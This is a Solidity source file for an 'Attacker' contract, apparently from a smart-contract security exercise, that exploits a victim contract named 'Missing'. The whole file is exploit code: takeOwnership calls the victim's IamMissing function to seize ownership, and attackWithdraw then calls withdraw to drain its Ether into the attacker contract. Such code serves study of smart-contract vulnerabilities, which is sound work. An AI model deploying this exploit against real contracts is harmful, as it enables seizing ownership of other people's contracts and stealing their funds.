// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

import "./Missing.sol";

contract Attacker {
    Missing public victimContract;

    constructor(address _victimAddress) public {
        victimContract = Missing(_victimAddress);
    }

    // Function to call `IamMissing` on the victim contract and take ownership
    function takeOwnership() public {
        victimContract.IamMissing();
    }

    // Function to withdraw funds from the victim contract
    function attackWithdraw() public {
        victimContract.withdraw();
    }

    // Function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    // Fallback function to receive Ether
    function() external payable {}
}
